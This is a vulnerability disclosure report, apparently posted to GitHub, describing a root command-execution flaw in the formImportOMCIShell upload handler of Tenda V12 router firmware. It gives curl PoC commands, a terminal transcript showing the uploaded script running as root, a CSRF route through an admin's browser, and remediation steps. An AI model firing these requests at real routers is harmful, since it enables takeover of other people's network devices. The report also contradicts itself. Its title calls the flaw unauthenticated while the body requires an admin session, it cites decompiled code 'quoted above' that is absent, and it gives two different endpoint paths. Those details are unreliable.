# Tenda V12 V56.1.1.11 was discovered to contain an unauthenticated shell upload and execution vulnerability in formImportOMCIShell

## Overview

- Vendor: Tenda
- Product: V12 (HG10/HG9 2025 and V300 share the same handler pattern)
- Version: V56.1.1.11
- Component: Boa formImportOMCIShell
- Vulnerability Class: CWE-434 unrestricted upload / CWE-78 command execution
- Manufacturer: https://www.tendacn.com/

## Affected version

- V12 ZIP.
- V12 `boa`.
- HG10/HG9 2025 `boa`.
  (same handler; dynamic in HG10/HG9 is tracked separately).

## Vulnerability details

The handler writes the multipart body (or a normal field such as a
`<textarea name="file">`) to `/tmp/omcishell`, then runs
`system("/bin/sh /tmp/omcishell")` as root. No file-type or content
validation is performed, and the handler does not require a real file part;
the text after the first `\r\n\r\n` is executed. The endpoint requires an
admin session, but Boa has no CSRF token and tracks login by source IP; an
admin browser can submit the form cross-site.

## PoC

```sh
# 676-byte shell script; the tail padding is needed for the handler's scan.
# Put the script in a normal multipart field named "file".
curl -F "file=@poc_omci_shell.sh;filename=omci.sh" \
     http://<router>/boaform/formImportOMCIShell

# Without a file part (textarea-style form):
curl --form-string "file=$PAYLOAD" \
     http://<router>/boaform/formImportOMCIShell
```

## Reproduction and terminal evidence

Environment: qemu-user V12 chroot with the real Boa and a test-only
`auth_authorize` patch; the handler and `system` are unchanged.

Terminal transcript:

```
$ curl -F "file=@poc_omci_shell.sh;filename=omci.sh" \
    http://127.0.0.1/boaform/formImportOMCIShell
create file omcishell
$ cat /tmp/omci_pwned
OMCI_PWNED
$ cat /dev/console
OMCI_PWNED
```

A headless Chrome page auto-submitted a `<textarea name="file">` multipart
form from a logged-in admin context; the guest created `/tmp/csrf_pwned`

## Verification

The vulnerable handler in the stock `Boa formImportOMCIShell` was decompiled from the unpacked rootfs (code quoted above), and the stock binary was run under qemu/FirmAE; the transcript is shown above.

## Impact

Authenticated admin or CSRF root command execution and persistence.

## Remediation

- Do not execute uploaded content. Remove the OMCI shell import feature or
  require a signed, validated firmware bundle.
- Add CSRF tokens and strict file-type/content checks.
- Run the import in a constrained parser, not `/bin/sh`.

## Known CVE relation

**CVE candidate type: new affected model (Tenda V12) for formImportOMCIShell — candidate new CVE.**

- CVE-2021-44132 covers the same handler in C-DATA firmware. NVD has no
  Tenda entry for `formImportOMCIShell` (2026-11-06). V12, HG10/HG9 2025 and
  V300 share the same code pattern; vendor should confirm the affected list.

## Status and disclosure

Dynamic confirmation in V12 (handler unchanged; CSRF verified). Candidate new CVE — new affected model (Tenda V12) for formImportOMCIShell; no CVE assigned. No vendor/CNA contact.

## Additional Information

```markdown
### Vendor
Tenda

### Product
V12 (HG10/HG9 2025 and V300 share the same handler pattern)

### Version or Commit
V56.1.1.11

### Vulnerability Class
CWE-434 unrestricted upload / CWE-78 command execution

### CVE_candidate_type
new affected model (Tenda V12) for formImportOMCIShell — candidate new CVE

### Description
formImportOMCIShell writes the multipart body to /tmp/omcishell and runs /bin/sh /tmp/omcishell as root without file-type or content validation.

### Affected_component
Boa formImportOMCIShell

### Attack_vector
Authenticated multipart POST to /goform/formImportOMCIShell with a shell script body.

### Product_version
V12 (HG10/HG9 2025 and V300 share the same handler pattern) V56.1.1.11

### Reference
- https://www.tendacn.com/
- https://github.com/vuln-1/vuln/blob/main/Tenda/V12_V56.1.1.11/report-1.md
```
